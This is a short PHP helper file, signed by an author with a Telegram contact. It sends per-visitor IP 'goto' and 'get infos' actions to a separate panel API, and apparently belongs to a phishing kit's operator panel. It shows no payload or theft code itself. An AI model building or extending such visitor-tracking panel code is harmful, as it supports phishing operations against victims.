<?php
    /*******
    Main Author: Z0N51
    Contact me on telegram : https://t.me/z0n51official
    ********************************************************/

    include dirname(dirname(__DIR__)) . '/panel/api.php';

    function panel($jsonData) {
        $jsonData = json_encode($jsonData);
        action($jsonData);
    }

    function resetgoto() {
        $jsonData = json_encode(['action' => 'RESETGOTO','ip'     => get_client_ip()]);
        action($jsonData);
    }

    function checkgoto() {
        $jsonData = json_encode(['action' => 'CHECKGOTO','ip'     => get_client_ip()]);
        $check = action($jsonData);
        return $check;
    }

    function getinfos() {
        $jsonData = json_encode(['action' => 'GET','ip'     => get_client_ip()]);
        $get = action($jsonData);
        return json_decode($get,true);
    }

?>